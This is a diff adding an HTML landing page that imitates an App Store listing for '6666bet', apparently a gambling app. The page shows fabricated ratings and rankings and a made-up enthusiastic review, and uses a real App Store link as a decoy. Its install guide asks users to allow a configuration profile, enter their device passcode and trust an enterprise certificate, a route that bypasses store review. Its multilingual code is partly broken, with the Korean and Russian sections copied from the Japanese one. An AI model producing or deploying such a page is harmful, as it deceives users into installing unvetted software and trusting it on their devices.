@@ -1,0 +1,938 @@
+<!doctype html>
+<html>
+<head design-width="750">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"/>
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="format-detection" content="telephone=no">
+<title></title>
+<link rel="stylesheet" href="css/reset.css" /><!--重置样式-->
+<link rel="stylesheet" href="css/style.css" /><!--页面样式-->
+<link rel="stylesheet" href="css/swiper.min.css">
+<script src="./tongji/tics.js"></script>
+<script src="js/auto-size.js"></script><!--设置字体大小-->
+<style>
+ .swiper-container {
+    width: 100%;
+    height: 100%;
+    border-radius: 10px; /* 添加圆角效果 */
+    overflow: hidden; /* 隐藏溢出内容以保持圆角效果 */
+  }
+  .swiper-slide img {
+    width: 100%;
+    height: auto;
+    border-radius: 10px; /* 添加圆角效果 */
+  }
+  .comment-info {
+    border-top: 1px solid #eee;
+    padding: 10px 0;
+    margin: 20px 0;
+}
+  .comment-message {
+    background-color: #f9f9f9;
+    border: 0;
+    border-radius: 10px;
+    line-height: 20px;
+}
+.comment-message>div {
+    padding: 0 10px;
+}
+.comment-message .comment-user {
+    margin-bottom: 5px;
+}
+.comment-message .comment-user span:first-child {
+    display: inline-block;
+    width: 69%;
+    text-align: left;
+    font-weight: bold;
+    font-size: 14px;
+    margin: 0;
+}
+.comment-message .comment-user span:last-child {
+    display: inline-block;
+    width: 29%;
+    text-align: right;
+    font-size: 12px;
+}
+.comment-message .comment-star {
+    font-size: 14px;
+}
+.comment-message .comment-star span:first-child {
+    color: #ffbb15;
+    display: inline-block;
+    width: 49%;
+    text-align: left;
+}
+.comment-message .comment-star span:last-child {
+    display: inline-block;
+    width: 49%;
+    text-align: right;
+    font-size: 12px;
+}
+.comment-message .comment-content {
+    padding: 5px 10px;
+    line-height: 20px;
+    font-size: 14px;
+}
+.scroll-container {
+  display: flex;
+  overflow-x: scroll;
+  scroll-snap-type: x mandatory;
+}
+
+img {
+  flex: none;
+  width: 100%;
+  height: auto;
+  scroll-snap-align: start;
+}
+
+</style>
+</head>
+<body ontouchstart=""onmouseover="">
+	<div class="mobile-wrap center">
+        <main>
+            <div class="language-select-box" style="float: right;">
+                <select id="languageSelect" style="font-size:16px" onchange="changeLanguage()">
+                     <option value="putaoya">Português</option>
+                    <option value="zh">中文</option>
+					<option value="zh_TW">繁體中文</option>
+					 <option value="en">English</option>
+                    <option value="putaoya">Português</option>
+                    <option value="ja">日本語</option>
+					
+
+                </select>
+            </div>
+        	<div class="appItem">
+                
+                <div class="left"><img src="img/a.png" alt=""></div>
+                <div class="right">
+                    <strong>6666bet<span>1+</span></strong>
+                    <p id="description">第 1 名</p>
+                    <div class="installBox">
+                        <div id="installLinkContainer">
+                            <a class="down" onclick="visita()" href="javascript:;" id="installLink">免费安装</a>
+                          </div>
+                          
+                        <a class="doubt" href="https://apps.apple.com/cn/app/id1002355194">?</a>
+                    </div>
+                </div>
+                <div id="v3TishiContainer">
+                    <span id="v3Tishi" style="color:red;font-size: 15px;padding-bottom:20px;margin-top: 10px;line-height: 30px;border-top: 1px solid #eee;padding-top: 5px;">
+                      提示：软件下载后请到iPhone设置-通用-VPN与设备管理-企业级app-信任证书
+                    </span>
+                  </div>
+                  
+                <div class="rate-info">
+            
+                    <div class="rate" style="width: 34%;">
+                        <p style="margin: 0" id="rating-text">10088个评分</p>
+                        <p style="margin-bottom: 0"><strong>4.9&nbsp;</strong></p>
+                        <p>
+                            <img src="./img/stars.png" style="width: 70%;">
+                        </p>
+                    </div>
+                    <div class="rate-line-between"></div>
+                    <div class="classification" style="width: 24%;">
+                        <p style="margin: 0" id="age-text">年龄</p>
+                        <p style="margin-bottom: 0"><strong>18+</strong></p>
+                        <div id="ageContainer">
+                            <p id="age">岁</p>
+                          </div>
+                    </div>
+                    <div class="rate-line-between"></div>
+                    <div class="classification" style="width: 24%;">
+                        <p style="margin: 0" id="ranking-text">排行榜</p>
+                        <p style="margin-bottom: 0"><strong>#1</strong></p>
+                        <div id="applicationContainer">
+                            <p id="application">应用</p>
+                          </div>
+                    </div>
+                    <div class="rate-line-between"></div>
+                    <div class="classification" style="width: 19%;">
+                        <p style="margin: 0" id="size-text">大小</p>
+                        <p style="margin-bottom: 0"><strong>28.66</strong></p>
+                        <p>M</p>
+                    </div>
+                </div>
+            </div>
+            
+           
+            
+       <style>
+    .slider-container {
+        overflow-x: scroll;
+        overflow-y: hidden;
+        white-space: nowrap;
+    }
+
+    .slider-container img {
+        display: inline-block;
+        height: auto;
+        width: calc(70% - 10px); /* 调整每张图片的宽度 */
+        max-width: 100%;
+        margin-right: 5px; /* 设置图片间的间距 */
+        border-radius: 10px;
+    }
+</style>
+
+<div class="slider-container">
+    <img src="img/1.jpg">
+    <img src="img/2.jpg">
+    <img src="img/3.jpg">
+    <img src="img/5.jpg">
+        <img src="img/1.jpg">
+            <img src="img/1.jpg">
+                <img src="img/1.jpg">
+                    <img src="img/1.jpg">
+</div>
+
+<script>
+    const sliderContainer = document.querySelector('.slider-container');
+
+    let isDragging = false;
+    let startPosition = 0;
+    let currentTranslate = 0;
+    let prevTranslate = 0;
+
+    sliderContainer.addEventListener('mousedown', e => {
+        if (e.target.tagName === 'IMG') {
+            isDragging = true;
+            startPosition = getPositionX(e);
+            prevTranslate = currentTranslate;
+            sliderContainer.style.cursor = 'grabbing';
+        }
+    });
+
+    sliderContainer.addEventListener('mousemove', e => {
+        if (!isDragging) return;
+        e.preventDefault();
+
+        const currentPosition = getPositionX(e);
+        currentTranslate = prevTranslate + currentPosition - startPosition;
+
+        // 防止滑动超出边界
+        const minTranslate = -(sliderContainer.scrollWidth - sliderContainer.clientWidth);
+        currentTranslate = Math.max(minTranslate, Math.min(0, currentTranslate));
+
+        updateSliderPosition();
+    });
+
+    sliderContainer.addEventListener('mouseup', () => {
+        if (isDragging) {
+            isDragging = false;
+            sliderContainer.style.cursor = 'grab';
+            snapToNearestImage();
+        }
+    });
+
+    sliderContainer.addEventListener('mouseleave', () => {
+        if (isDragging) {
+            isDragging = false;
+            sliderContainer.style.cursor = 'grab';
+            snapToNearestImage();
+        }
+    });
+
+    function getPositionX(event) {
+        return event.type.includes('mouse') ? event.pageX : event.touches[0].clientX;
+    }
+
+    function updateSliderPosition() {
+        sliderContainer.style.transform = `translateX(${currentTranslate}px)`;
+    }
+
+    function snapToNearestImage() {
+        const images = Array.from(sliderContainer.querySelectorAll('img'));
+        const imageWidth = images[0].offsetWidth + 10; // 图片宽度加上间距
+
+        const nearestImageIndex = Math.round(-currentTranslate / imageWidth);
+        currentTranslate = -nearestImageIndex * imageWidth;
+
+        updateSliderPosition();
+    }
+</script>
+
+        	<div class="comment">
+    <strong id="publicTitle" class="publicTitle">评分及评论</strong>
+    <div class="left">
+        <b id="rating-text">4.9</b>
+        <p>满分 5 分</p>
+    </div>
+    <div class="right">
+        <div class="star_row">
+            <span class="s1"><i></i></span>
+            <div class="lineBox"><var class="v1"></var></div>
+        </div>
+        <div class="star_row">
+            <span class="s2"><i></i></span>
+            <div class="lineBox"><var class="v2"></var></div>
+        </div>
+        <div class="star_row">
+            <span class="s3"><i></i></span>
+            <div class="lineBox"><var class="v3"></var></div>
+        </div>
+        <div class="star_row">
+            <span class="s4"><i></i></span>
+            <div class="lineBox"><var class="v4"></var></div>
+        </div>
+        <div class="star_row">
+            <span class="s5"><i></i></span>
+            <div class="lineBox"><var class="v5"></var></div>
+        </div>
+        <p id="rating-count">19k 个评分</p>
+    </div>
+</div>
+<div class="comment-info comment-message" style="">
+    <div>
+        <p class="comment-user"><span id="comment-text" class="fy22">非常不错的应用，推荐！</span><span id="comment-date">05-07</span></p>
+        <div class="comment-star"><span><img src="img/stars-gold.jpg" style="width:45%"></span><span id="comment-author">James Levine</span></div>
+    </div>
+    <div class="comment-content fy23" id="comment-content">这个应用真的太好用了，应用流畅不卡顿，画面清晰，操作便捷，玩法丰富多样，同事都在玩这个App，朋友们可以试试看，真的是非常的不错，强烈推荐推荐推荐！！！</div>
+</div>
+<div class="newFunction">
+    <strong id="otherTitle" class="publicTitle">新功能</strong>
+    <p id="newFunctionDescription">1.0</p>
+</div>
+<div class="appInfo">
+    <strong id="appInfoTitle" class="publicTitle">信息</strong>
+    <div class="box">
+        <ul>
+            <li>
+                <span id="size-textb">大小</span>
+                <p id="sizeValue">4.5 MB</p>
+            </li>
+            <li>
+                <span id="compatibility">兼容性</span>
+                <p id="compatibilityValue">Android系统 或 iOS 8.0 或更高版本。与 iPhone和 iPod touch 兼容。</p>
+            </li>
+            <li>
+                <span id="language">语言</span>
+                <p id="languageValue">英语,简体中文</p>
+            </li>
+            <li>
+                <span id="ageRating">年龄分级</span>
+                <p id="ageRatingValue">限18岁以上</p>
+            </li>
+            <li>
+                <span id="copyright">版权</span>
+                <p id="copyrightValue">© 2018 MobiFun Games Inc</p>
+            </li>
+            <li>
+                <span id="price">价格</span>
+                <p id="priceValue">免费</p>
+            </li>
+            <li>
+                <span id="privacyPolicy">隐私政策</span>
+                <p id="privacyPolicyValue">✋</p>
+            </li>
+        </ul>
+    </div>
+
+        	</div>
+        </main>
+		<div class="footer">
+			<p id="mianze">免责声明：</p>
+			<p class="p2" id="shengming">本网站仅为“开发者提供的网站”进行自动打包生成App和App的下载托管，App内的内容和运营相关事项由App开发者负责，与本网站无关，如有违法违规，联系我们举报</p>
+		</div>
+		<div class="pup">
+			<div class="guide">
+				<i class="colse"></i>
+				<div class="pics">
+					<div class="swiper-container">
+					    <div class="swiper-wrapper">
+						     <div class="swiper-slide">
+						     	<div class="pic"><img src="img/0df0c_0_600_411.jpg" alt=""></div>
+						     	<div class="text">安装引导<br>第一步  允许打开配置描述文件</div>
+						     </div>
+						     <div class="swiper-slide">
+						     	<div class="pic"><img src="img/9179e_3_600_411.jpg" alt=""></div>
+						     	<div class="text">安装引导<br>第二步  点击右上角安装按钮</div>
+						     </div>
+						     <div class="swiper-slide">
+						     	<div class="pic"><img src="img/d3c74_2_600_411.jpg" alt=""></div>
+						     	<div class="text">安装引导<br>第三步  输入开机解锁密码 </div>
+						     </div>
+						     <div class="swiper-slide">
+						     	<div class="pic"><img src="img/0665a_1_600_411.jpg" alt=""></div>
+						     	<div class="text">安装引导<br>第四步  点击下方安装按钮 </div>
+						     </div>
+					    </div>
+					    <div class="swiper-pagination"></div>
+					</div>
+				</div>
+				<div class="smallTip"><a href="#">什么是描述文件？</a></div>
+			</div>
+		</div>
+		<div class="pupPic"><img src="img/5cbc4_5_1242_2007.png" alt=""></div>
+    </div><!--mobile_wrap-->
+
+    <div class="wechat-ios">
+      <img src="img/5cbc4_5_1242_2007.png" >
+    </div>
+    <div class="wechat-android">
+      <img src="img/5cbc4_5_1242_2007-andoird.png" >
+    </div>
+    <div class="wechat-mask" style="display: none;">
+        <div class="mask-bg"></div>
+        <div class="mask-pop">
+            <img class="copy-url-img" src="img/safari-tip.png">
+            <div class="copy-url">
+                <input id="ipt_url" type="text">
+                <button data-clipboard-target="#ipt_url">复制</button>
+            </div>
+        </div>
+    </div>
+    <script src="js/clipboard.min.js"></script><!--jQ库-->
+	<script src="js/jquery-2.2.4.min.js"></script><!--jQ库-->
+    <script src="js/swiper.min.js"></script>
+  <script>
+  
+
+    var swiper = new Swiper('.swiper-container', {
+      pagination: {
+        el: '.swiper-pagination',
+      },
+      loop: true // 添加无限循环配置
+
+    });
+  </script>
+   <script>
+
+function changeLanguage() {
+  var selectedLanguage = document.getElementById("languageSelect").value;
+
+  if (selectedLanguage === "en") {
+    setEnglishText();
+  } else if (selectedLanguage === "zh") {
+    setChineseText();
+  } else if (selectedLanguage === "zh_TW") {
+    setTraditionalChineseText();
+  } else if (selectedLanguage === "putaoya") {
+    setPortugueseText();
+  } else if (selectedLanguage === "ja") {
+    setJapaneseText();
+	  } else if (selectedLanguage === "hanyu") {
+    setKoreanText();
+		  } else if (selectedLanguage === "eyu") {
+    setRussianText();
+  }
+}
+//英语翻译
+function setEnglishText() {
+  document.getElementById("description").textContent = "Rank 1";
+  document.getElementById("rating-text").textContent = "10088 ratings";
+  document.getElementById("age-text").textContent = "Age";
+  document.getElementById("ranking-text").textContent = "Ranking";
+  document.getElementById("size-text").textContent = "Size";
+  document.getElementById("v3Tishi").textContent = "Hint: After downloading the software, please go to iPhone Settings - General - VPN & Device Management - Enterprise App - Trust Certificate";
+  document.getElementById("installLink").textContent = "Free Installation";
+  document.getElementById("age").textContent = "years old";
+  document.getElementById("application").textContent = "Application";
+  document.getElementById("otherTitle").textContent = "New Features";
+document.getElementById("newFunctionDescription").textContent = "1.0";
+document.getElementById("appInfoTitle").textContent = "Information";
+document.getElementById("size-textb").textContent = "Size";
+document.getElementById("sizeValue").textContent = "4.5 MB";
+document.getElementById("compatibility").textContent = "Compatibility";
+document.getElementById("compatibilityValue").textContent = "Android system or iOS 8.0 or higher. Compatible with iPhone and iPod touch.";
+document.getElementById("language").textContent = "Language";
+document.getElementById("languageValue").textContent = "English, Simplified Chinese";
+document.getElementById("ageRating").textContent = "Age Rating";
+document.getElementById("ageRatingValue").textContent = "18+";
+document.getElementById("copyright").textContent = "Copyright";
+document.getElementById("copyrightValue").textContent = "© 2018 MobiFun Games Inc";
+document.getElementById("price").textContent = "Price";
+document.getElementById("priceValue").textContent = "Free";
+document.getElementById("privacyPolicy").textContent = "Privacy Policy";
+document.getElementById("privacyPolicyValue").textContent = "✋";
+document.getElementById("mianze").textContent = "Disclaimer:";
+document.getElementById("shengming").textContent = "This website only provides automatic packaging and hosting of apps generated by developers. The content and operational matters of the app are the responsibility of the app developer and have no relation to this website. Please contact us to report any illegal or irregular activities.";
+
+// Update the Chinese text in the comment section
+document.querySelector(".comment .publicTitle").textContent = "Ratings and Reviews";
+document.querySelector(".comment b").textContent = "4.9";
+document.querySelector(".comment p").textContent = "Out of 5";
+document.querySelector(".comment .right p").textContent = "19k ratings";
+
+// Update the Chinese text in the comment info section
+document.querySelector(".comment-info .comment-user .fy22").textContent = "Great app, highly recommended!";
+document.querySelector(".comment-info .comment-user span:last-child").textContent = "05-07";
+document.querySelector(".comment-info .comment-content").textContent = "This app is really amazing. It runs smoothly, has clear graphics, and offers convenient controls. There are plenty of diverse gameplay options. My colleagues are also using this app. Friends, you should give it a try. It's truly remarkable. Highly recommended!!!";
+
+
+
+
+
+}
+//中文简体翻译
+function setChineseText() {
+  document.getElementById("description").textContent = "第 1 名";
+  document.getElementById("rating-text").textContent = "10088个评分";
+  document.getElementById("age-text").textContent = "年龄";
+  document.getElementById("ranking-text").textContent = "排行榜";
+  document.getElementById("size-text").textContent = "大小";
+  document.getElementById("v3Tishi").textContent = "提示：软件下载后请到iPhone设置-通用-VPN与设备管理-企业级app-信任证书";
+  document.getElementById("installLink").textContent = "免费安装";
+  document.getElementById("age").textContent = "岁";
+  document.getElementById("application").textContent = "应用";
+  document.getElementById("otherTitle").textContent = "新功能";
+  document.getElementById("newFunctionDescription").textContent = "1.0";
+  document.getElementById("appInfoTitle").textContent = "信息";
+  document.getElementById("size-textb").textContent = "大小";
+  document.getElementById("sizeValue").textContent = "4.5 MB";
+  document.getElementById("compatibility").textContent = "兼容性";
+  document.getElementById("compatibilityValue").textContent = "Android系统 或 iOS 8.0 或更高版本。与 iPhone和 iPod touch 兼容。";
+  document.getElementById("language").textContent = "语言";
+  document.getElementById("languageValue").textContent = "英语,简体中文";
+  document.getElementById("ageRating").textContent = "年龄分级";
+  document.getElementById("ageRatingValue").textContent = "限18岁以上";
+  document.getElementById("copyright").textContent = "Copyright";
+  document.getElementById("copyrightValue").textContent = "© 2018 MobiFun Games Inc";
+  document.getElementById("price").textContent = "价格";
+  document.getElementById("priceValue").textContent = "免费";
+  document.getElementById("privacyPolicy").textContent = "隐私政策";
+  document.getElementById("privacyPolicyValue").textContent = "✋";
+  document.getElementById("mianze").textContent = "免责声明：";
+  document.getElementById("shengming").textContent = "本网站仅为“开发者提供的网站”进行自动打包生成App和App的下载托管，App内的内容和运营相关事项由App开发者负责，与本网站无关，如有违法违规，联系我们举报";
+
+  // 添加评论部分的中文文本更新
+  document.querySelector(".comment .publicTitle").textContent = "评分及评论";
+  document.querySelector(".comment b").textContent = "4.9";
+  document.querySelector(".comment p").textContent = "满分 5 分";
+  document.querySelector(".comment .right p").textContent = "19k 个评分";
+
+  // 添加评论信息部分的中文文本更新
+  document.querySelector(".comment-info .comment-user .fy22").textContent = "非常不错的应用，推荐！";
+  document.querySelector(".comment-info .comment-user span:last-child").textContent = "05-07";
+  document.querySelector(".comment-info .comment-content").textContent = "这个应用真的太好用了，应用流畅不卡顿，画面清晰，操作便捷，玩法丰富多样，同事都在玩这个App，朋友们可以试试看，真的是非常的不错，强烈推荐推荐推荐！！！";
+
+}
+//中文繁体翻译
+function setTraditionalChineseText() {
+  document.getElementById("description").textContent = "第 1 名";
+  document.getElementById("rating-text").textContent = "10088個評分";
+  document.getElementById("age-text").textContent = "年齡";
+  document.getElementById("ranking-text").textContent = "排行榜";
+  document.getElementById("size-text").textContent = "大小";
+  document.getElementById("v3Tishi").textContent = "提示：軟件下載後請到iPhone設置-通用-VPN與設備管理-企業級app-信任證書";
+  document.getElementById("installLink").textContent = "免費安裝";
+  document.getElementById("age").textContent = "歲";
+  document.getElementById("application").textContent = "應用";
+  document.getElementById("otherTitle").textContent = "新功能";
+document.getElementById("newFunctionDescription").textContent = "1.0";
+document.getElementById("appInfoTitle").textContent = "信息";
+document.getElementById("size-textb").textContent = "大小";
+document.getElementById("sizeValue").textContent = "4.5 MB";
+document.getElementById("compatibility").textContent = "兼容性";
+document.getElementById("compatibilityValue").textContent = "支援 Android 系統或 iOS 8.0 或更高版本。與 iPhone 和 iPod touch 相容。";
+document.getElementById("language").textContent = "語言";
+document.getElementById("languageValue").textContent = "英文、簡體中文";
+document.getElementById("ageRating").textContent = "年齡分級";
+document.getElementById("ageRatingValue").textContent = "限制 18 歲以上";
+document.getElementById("copyright").textContent = "版權";
+document.getElementById("copyrightValue").textContent = "© 2018 MobiFun Games Inc";
+document.getElementById("price").textContent = "價格";
+document.getElementById("priceValue").textContent = "免費";
+document.getElementById("privacyPolicy").textContent = "隱私政策";
+document.getElementById("privacyPolicyValue").textContent = "✋";
+document.getElementById("mianze").textContent = "免責聲明：";
+document.getElementById("shengming").textContent = "本網站僅為「開發者提供的網站」進行自動打包生成App和App的下載託管，App內的內容和運營相關事項由App開發者負責，與本網站無關，如有違法違規，聯繫我們舉報。";
+
+
+// Update the Chinese text in the comment section
+document.querySelector(".comment .publicTitle").textContent = "評分及評論";
+document.querySelector(".comment b").textContent = "4.9";
+document.querySelector(".comment p").textContent = "滿分 5 分";
+document.querySelector(".comment .right p").textContent = "19k 個評分";
+
+// Update the Chinese text in the comment info section
+document.querySelector(".comment-info .comment-user .fy22").textContent = "非常不錯的應用，推薦！";
+document.querySelector(".comment-info .comment-user span:last-child").textContent = "05-07";
+document.querySelector(".comment-info .comment-content").textContent = "這個應用真的太好用了，應用流暢不卡頓，畫面清晰，操作便捷，玩法豐富多樣，同事都在玩這個 App，朋友們可以試試看，真的是非常的不錯，強烈推薦推薦推薦！！！";
+
+
+
+}
+//葡萄牙语翻译
+function setPortugueseText() {
+  document.getElementById("description").textContent = "primeiro lugar";
+  document.getElementById("rating-text").textContent = "10088 avaliações";
+  document.getElementById("age-text").textContent = "Idade";
+  document.getElementById("ranking-text").textContent = "Classificação";
+  document.getElementById("size-text").textContent = "Tamanho";
+  document.getElementById("v3Tishi").textContent = "Sugestão: Depois de descarregar o software, aceda a Definições do iPhone - Geral - VPN e gestão de dispositivos - Aplicação empresarial - Certificado de confiança";
+  document.getElementById("installLink").textContent = "Instalação gratuita";
+  document.getElementById("age").textContent = "anos de idade";
+  document.getElementById("application").textContent = "Aplicação";
+  document.getElementById("otherTitle").textContent = "Nova funcionalidade";
+  document.getElementById("newFunctionDescription").textContent = "1.0";
+  document.getElementById("appInfoTitle").textContent = "Informações";
+  document.getElementById("size-textb").textContent = "Tamanho";
+  document.getElementById("sizeValue").textContent = "4,5 MB";
+  document.getElementById("compatibility").textContent = "Compatibilidade";
+  document.getElementById("compatibilityValue").textContent = "Android ou iOS 8.0 ou versões superiores. Compatível com iPhone e iPod touch.";
+  document.getElementById("language").textContent = "Idioma";
+  document.getElementById("languageValue").textContent = "Inglês, Chinês Simplificado";
+  document.getElementById("ageRating").textContent = "Classificação etária";
+  document.getElementById("ageRatingValue").textContent = "Para maiores de 18 anos";
+  document.getElementById("copyright").textContent = "Direitos autorais";
+  document.getElementById("copyrightValue").textContent = "© 2018 MobiFun Games Inc";
+  document.getElementById("price").textContent = "Preço";
+  document.getElementById("priceValue").textContent = "Grátis";
+  document.getElementById("privacyPolicy").textContent = "Política de Privacidade";
+  document.getElementById("privacyPolicyValue").textContent = "✋";
+  document.getElementById("mianze").textContent = "Aviso Legal:";
+document.getElementById("shengming").textContent = "Este site apenas fornece empacotamento automático e hospedagem de aplicativos gerados por desenvolvedores. O conteúdo e as questões operacionais do aplicativo são de responsabilidade do desenvolvedor do aplicativo e não têm relação com este site. Entre em contato conosco para relatar qualquer atividade ilegal ou irregular.";
+
+
+  // Atualização do texto em chinês na seção de comentários
+  
+
+  // Atualização do texto em chinês na seção de informações dos comentários
+  document.querySelector(".comment-info .comment-user .fy22").textContent = "Ótimo aplicativo, recomendo!";
+  document.querySelector(".comment-info .comment-user span:last-child").textContent = "05-07";
+  document.querySelector(".comment-info .comment-content").textContent = "Este aplicativo é realmente muito bom, funciona sem travamentos, com imagens nítidas, fácil de usar, com uma variedade de jogabilidade. Meus colegas estão jogando este app, recomendo fortemente! Experimentem, é realmente muito bom, altamente recomendado!!!";
+
+
+
+}
+//日语翻译
+function setJapaneseText() {
+  document.getElementById("description").textContent = "第1位";
+  document.getElementById("rating-text").textContent = "10088の評価";
+  document.getElementById("age-text").textContent = "年齢";
+  document.getElementById("ranking-text").textContent = "ランキング";
+  document.getElementById("size-text").textContent = "サイズ";
+  document.getElementById("v3Tishi").textContent = "ヒント：ソフトウェアをダウンロードした後、iPhoneの設定-一般-VPNとデバイス管理-エンタープライズアプリ-信頼できる証明書に移動してください";
+  document.getElementById("installLink").textContent = "無料インストール";
+  document.getElementById("age").textContent = "歳";
+  document.getElementById("application").textContent = "アプリケーション";
+  document.getElementById("otherTitle").textContent = "新機能";
+document.getElementById("newFunctionDescription").textContent = "1.0";
+document.getElementById("appInfoTitle").textContent = "情報";
+document.getElementById("size-textb").textContent = "サイズ";
+document.getElementById("sizeValue").textContent = "4.5 MB";
+document.getElementById("compatibility").textContent = "互換性";
+document.getElementById("compatibilityValue").textContent = "AndroidシステムまたはiOS 8.0以上。iPhoneおよびiPod touchに対応しています。";
+document.getElementById("language").textContent = "言語";
+document.getElementById("languageValue").textContent = "英語、簡体中国語";
+document.getElementById("ageRating").textContent = "年齢レーティング";
+document.getElementById("ageRatingValue").textContent = "18歳以上";
+document.getElementById("copyright").textContent = "著作権";
+document.getElementById("copyrightValue").textContent = "© 2018 MobiFun Games Inc";
+document.getElementById("price").textContent = "価格";
+document.getElementById("priceValue").textContent = "無料";
+document.getElementById("privacyPolicy").textContent = "プライバシーポリシー";
+document.getElementById("privacyPolicyValue").textContent = "✋";
+document.getElementById("mianze").textContent = "免責事項：";
+document.getElementById("shengming").textContent = "当ウェブサイトは開発者が提供するウェブサイトを自動的にパッケージ化し、アプリとそのダウンロードのホスティングを行うためのものです。アプリ内の内容や運営に関する事項は、アプリの開発者が責任を持ち、当ウェブサイトとは関係ありません。違法行為や規則違反がある場合は、ご連絡いただき報告してください。";
+
+
+// コメントセクションの日本語テキスト更新
+document.querySelector(".comment .publicTitle").textContent = "評価とコメント";
+document.querySelector(".comment b").textContent = "4.9";
+document.querySelector(".comment p").textContent = "最高評価 5 点";
+document.querySelector(".comment .right p").textContent = "19,000 件の評価";
+
+// コメント情報セクションの日本語テキスト更新
+document.querySelector(".comment-info .comment-user .fy22").textContent = "とても素晴らしいアプリ、おすすめです！";
+document.querySelector(".comment-info .comment-user span:last-child").textContent = "05-07";
+document.querySelector(".comment-info .comment-content").textContent = "このアプリは本当に使いやすく、スムーズで、画質が良く、操作が簡単で、多様なゲームプレイがあります。同僚たちもこのアプリを遊んでいます。友達も試してみてください。本当にとても素晴らしいです。強くおすすめします！！！";
+
+}
+//韩语翻译
+function setKoreanText() {
+  document.getElementById("description").textContent = "第1位";
+  document.getElementById("rating-text").textContent = "10088の評価";
+  document.getElementById("age-text").textContent = "年齢";
+  document.getElementById("ranking-text").textContent = "ランキング";
+  document.getElementById("size-text").textContent = "サイズ";
+  document.getElementById("v3Tishi").textContent = "ヒント：ソフトウェアをダウンロードした後、iPhoneの設定-一般-VPNとデバイス管理-エンタープライズアプリ-信頼できる証明書に移動してください";
+  document.getElementById("installLink").textContent = "無料インストール";
+  document.getElementById("age").textContent = "歳";
+  document.getElementById("application").textContent = "アプリケーション";
+  document.getElementById("otherTitle").textContent = "新機能";
+document.getElementById("newFunctionDescription").textContent = "1.0";
+document.getElementById("appInfoTitle").textContent = "情報";
+document.getElementById("size-textb").textContent = "サイズ";
+document.getElementById("sizeValue").textContent = "4.5 MB";
+document.getElementById("compatibility").textContent = "互換性";
+document.getElementById("compatibilityValue").textContent = "AndroidシステムまたはiOS 8.0以上。iPhoneおよびiPod touchに対応しています。";
+document.getElementById("language").textContent = "言語";
+document.getElementById("languageValue").textContent = "英語、簡体中国語";
+document.getElementById("ageRating").textContent = "年齢レーティング";
+document.getElementById("ageRatingValue").textContent = "18歳以上";
+document.getElementById("copyright").textContent = "著作権";
+document.getElementById("copyrightValue").textContent = "© 2018 MobiFun Games Inc";
+document.getElementById("price").textContent = "価格";
+document.getElementById("priceValue").textContent = "無料";
+document.getElementById("privacyPolicy").textContent = "プライバシーポリシー";
+document.getElementById("privacyPolicyValue").textContent = "✋";
+document.getElementById("mianze").textContent = "免責事項：";
+document.getElementById("shengming").textContent = "当ウェブサイトは開発者が提供するウェブサイトを自動的にパッケージ化し、アプリとそのダウンロードのホスティングを行うためのものです。アプリ内の内容や運営に関する事項は、アプリの開発者が責任を持ち、当ウェブサイトとは関係ありません。違法行為や規則違反がある場合は、ご連絡いただき報告してください。";
+
+
+// コメントセクションの日本語テキスト更新
+document.querySelector(".comment .publicTitle").textContent = "評価とコメント";
+document.querySelector(".comment b").textContent = "4.9";
+document.querySelector(".comment p").textContent = "最高評価 5 点";
+document.querySelector(".comment .right p").textContent = "19,000 件の評価";
+
+// コメント情報セクションの日本語テキスト更新
+document.querySelector(".comment-info .comment-user .fy22").textContent = "とても素晴らしいアプリ、おすすめです！";
+document.querySelector(".comment-info .comment-user span:last-child").textContent = "05-07";
+document.querySelector(".comment-info .comment-content").textContent = "このアプリは本当に使いやすく、スムーズで、画質が良く、操作が簡単で、多様なゲームプレイがあります。同僚たちもこのアプリを遊んでいます。友達も試してみてください。本当にとても素晴らしいです。強くおすすめします！！！";
+
+}
+//俄语翻译
+function setKoreanText() {
+  document.getElementById("description").textContent = "第1位";
+  document.getElementById("rating-text").textContent = "10088の評価";
+  document.getElementById("age-text").textContent = "年齢";
+  document.getElementById("ranking-text").textContent = "ランキング";
+  document.getElementById("size-text").textContent = "サイズ";
+  document.getElementById("v3Tishi").textContent = "ヒント：ソフトウェアをダウンロードした後、iPhoneの設定-一般-VPNとデバイス管理-エンタープライズアプリ-信頼できる証明書に移動してください";
+  document.getElementById("installLink").textContent = "無料インストール";
+  document.getElementById("age").textContent = "歳";
+  document.getElementById("application").textContent = "アプリケーション";
+  document.getElementById("otherTitle").textContent = "新機能";
+document.getElementById("newFunctionDescription").textContent = "1.0";
+document.getElementById("appInfoTitle").textContent = "情報";
+document.getElementById("size-textb").textContent = "サイズ";
+document.getElementById("sizeValue").textContent = "4.5 MB";
+document.getElementById("compatibility").textContent = "互換性";
+document.getElementById("compatibilityValue").textContent = "AndroidシステムまたはiOS 8.0以上。iPhoneおよびiPod touchに対応しています。";
+document.getElementById("language").textContent = "言語";
+document.getElementById("languageValue").textContent = "英語、簡体中国語";
+document.getElementById("ageRating").textContent = "年齢レーティング";
+document.getElementById("ageRatingValue").textContent = "18歳以上";
+document.getElementById("copyright").textContent = "著作権";
+document.getElementById("copyrightValue").textContent = "© 2018 MobiFun Games Inc";
+document.getElementById("price").textContent = "価格";
+document.getElementById("priceValue").textContent = "無料";
+document.getElementById("privacyPolicy").textContent = "プライバシーポリシー";
+document.getElementById("privacyPolicyValue").textContent = "✋";
+document.getElementById("mianze").textContent = "免責事項：";
+document.getElementById("shengming").textContent = "当ウェブサイトは開発者が提供するウェブサイトを自動的にパッケージ化し、アプリとそのダウンロードのホスティングを行うためのものです。アプリ内の内容や運営に関する事項は、アプリの開発者が責任を持ち、当ウェブサイトとは関係ありません。違法行為や規則違反がある場合は、ご連絡いただき報告してください。";
+
+
+// コメントセクションの日本語テキスト更新
+document.querySelector(".comment .publicTitle").textContent = "評価とコメント";
+document.querySelector(".comment b").textContent = "4.9";
+document.querySelector(".comment p").textContent = "最高評価 5 点";
+document.querySelector(".comment .right p").textContent = "19,000 件の評価";
+
+// コメント情報セクションの日本語テキスト更新
+document.querySelector(".comment-info .comment-user .fy22").textContent = "とても素晴らしいアプリ、おすすめです！";
+document.querySelector(".comment-info .comment-user span:last-child").textContent = "05-07";
+document.querySelector(".comment-info .comment-content").textContent = "このアプリは本当に使いやすく、スムーズで、画質が良く、操作が簡単で、多様なゲームプレイがあります。同僚たちもこのアプリを遊んでいます。友達も試してみてください。本当にとても素晴らしいです。強くおすすめします！！！";
+
+}
+window.onload = function() {
+    setPortugueseText(); // 设置默认语言为中文（可根据需要修改）
+}
